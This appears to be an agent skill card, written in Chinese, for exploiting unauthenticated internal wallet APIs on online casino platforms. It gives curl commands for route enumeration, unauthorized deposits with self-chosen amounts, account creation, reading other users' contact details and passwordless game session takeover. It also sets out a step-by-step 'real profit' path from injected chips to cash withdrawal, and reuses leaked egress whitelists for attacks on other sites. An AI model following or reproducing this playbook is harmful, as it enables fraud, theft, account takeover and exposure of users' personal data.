---
name: internal-wallet-transfer-unauth
description: >-
  Use when 赌场/游戏平台暴露出内部钱包对接服务（FastAPI /openapi.json 全路由）：transfer/init、
  deposit、withdraw-all、ensure-user、launch-url 无鉴权。含路由枚举、双账本判定、任意用户建号、
  免密进游戏 ssid、/diag/egress 出口白名单泄露。
---

# 内部钱包对接 API 未授权（游戏钱包 transfer 组）

实战来源：B8Casino / GGX 类平台（2026-10），`/openapi.json` 230 条路由零鉴权。

## When to Use

- 目标有 `api.` / `<brand>-api.` / `g.<domain>` 子域，返回 FastAPI 风格 JSON（`{"detail":"Not Found"}`）
- 路径带 `vendor`、`bridge`、`wallet`、`game`、`transfer`、`launch`
- 平台是白标赌场/棋牌，前端 H5 调 `launch-url` 进游戏

## 1. 先拿全路由（关键一步）

```bash
curl -s https://目标/openapi.json -o o.json
python3 - <<'PY'
import json;d=json.load(open("o.json"))
print(d.get("info"))
for p,v in d["paths"].items():
    print(",".join(m.upper() for m in v), p)
PY
```

- 也试 `/v3/api-docs`、`/swagger-ui/index.html`、`/api-docs`、`/docs`
- 记下路由数（实战见过 230 条），按前缀分组：`/transfer/` `/wallet/` `/user/` `/game/` `/diag/` `/admin/`

## 2. 未鉴权判定

```bash
curl -s -i https://目标/transfer/init -H 'Content-Type: application/json' -d '{"userCode":"probe001","vendorCode":"GGX"}'
```

- 返回业务 JSON（不是 401/403/302 登录页）即未鉴权
- 用**带前缀的探测账号**（`zz_probe_*`），别拿真实用户做写操作

## 3. transfer 组逐条打

| 路由 | 作用 | 副作用 |
|---|---|---|
| `POST /transfer/init` | 初始化/绑定游戏账号 | 建脏数据（可接受） |
| `POST /transfer/deposit` | 从平台钱包划入游戏钱包，**金额自填** | 有价值：白送筹码 |
| `POST /transfer/withdraw-all` | 游戏钱包全部划回平台 | 清零/搬运 |
| `POST /transfer/ensure-user` | 不存在就创建任意 userCode | 建号 |
| `GET /user/info?userCode=` | 读手机号/邮箱/注册时间 | 读取他人资料 |
| `POST /game/launch-url` | 生成带 ssid 的免登录游戏地址 | 直接进游戏 |

## 4. 双账本判定（决定值不值钱）

平台通常两套账：

- **游戏钱包**（vendor 侧，`/wallet/balance` 查）—— 上面的 deposit 只动这里
- **现金钱包**（平台侧，提现走它）

```bash
curl -s 'https://目标/wallet/balance?userCode=zz_probe_001'
# 再回平台 H5 看"我的余额"是否同步变化
```

- 若平台侧余额**不变** → 打到的只是游戏筹码，别急着报「任意充值」
- 找桥接：`/transfer/bridge`、`/settle`、`/convert`、`/game/result`（对局结算回调）—— 结算接口通常把游戏余额写回现金账
- 真实收益路径：`deposit` 灌筹码 → 游戏内下注/对刷 → `result` 回调 → 现金账入账 → 提现

## 5. 免密进游戏（比改余额更快出证据）

```bash
curl -s -X POST https://目标/game/launch-url \
  -H 'Content-Type: application/json' \
  -d '{"userCode":"zz_probe_001","gameCode":"GGX","lang":"zh"}'
# 返回 https://<game-domain>/?ssid=...&token=...
```

- ssid 一般 5-30 分钟有效，直接浏览器官开就是**已登录该账号**的游戏界面
- 这是「会话接管」级证据，不写库、不改余额，最干净

## 6. 顺手的两个高价值面

- `GET /diag/egress` → 平台出口 IP / 代理池白名单（打别的高防站、判 IP 白名单时有用）
- `GET /admin/...` 组：不少实现把后台路由也挂在同一服务上，只是前端不展示

## 判据门槛

- **L1**：`/openapi.json` 可读，路由数落表
- **L2**：`/transfer/init`、`/wallet/balance` 返回业务 JSON（无 401）
- **L3**：`launch-url` 拿到 ssid 能进游戏；或 `deposit` 后 `balance` 变化可复现

## 坑

1. `deposit` 常需 `orderNo` 幂等键 → 每次换新 UUID，重复单号会被拒
2. `withdraw-all` 会把测试账号清零，别在真实用户上打
3. 有些平台 `/transfer/*` 校验 `vendorCode` 与来源 IP 绑定 → 结合 `/diag/egress` 的白名单判断
4. 返回 200 但 body `{"code":500}` 属业务拒绝，不等于未鉴权成功 —— 看 `code`/`msg`

## 相关卡

- `fund-edge-ops` — 资金面边缘越权（wallet_id 旁路、双路径资金 API）
- `white-label-casino-pentest` — 白标赌场识别与 H5 面
- `gambling-agent-backend-takeover` — 代理后台侧
